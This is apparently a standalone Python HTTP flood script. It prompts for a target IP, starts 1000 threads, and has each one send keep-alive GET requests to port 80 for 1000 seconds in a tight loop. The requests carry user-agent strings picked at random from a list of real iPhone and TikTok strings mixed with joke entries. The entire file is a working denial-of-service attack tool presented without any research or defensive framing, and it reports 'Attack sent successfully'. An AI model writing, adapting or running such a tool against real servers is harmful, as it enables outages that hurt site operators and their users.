import socket
import time
import random
import threading
from threading import Thread

def UAlist():
    return [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Podcasts/1650.20 CFNetwork/1333.0.4 Darwin/21.5.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/0 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US ByteFullLocale/en isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1",
        "AppleCoreMedia/1.0.0.19F77 (iPhone; U; CPU OS 15_5 like Mac OS X; nl_nl)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 musical_ly_25.1.1 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US RevealType/Dialog isDarkMode/1 WKWebView/1 BytedanceWebview/d8a21c6 FalconTag/",
        "bbos",
        "urmom",
        "xd",
        "null"
    ]

def http(ip, port, floodtime):
    while time.time() < floodtime:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.connect((ip, port))
                while time.time() < floodtime:
                    sock.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(UAlist())}\r\nConnection: keep-alive\r\n\r\n'.encode())
                print("Color.LG+f'\n [!] Attack sent successfully!\n'")
            except:
                sock.close()

def start_attack():
    ip = input("ip: ")
    port = 80
    threads = 1000
    duration = 1000

    
    
    for _ in range(threads):
        Thread(target=http, args=(ip, port, time.time() + duration)).start()

if __name__ == "__main__":
    start_attack()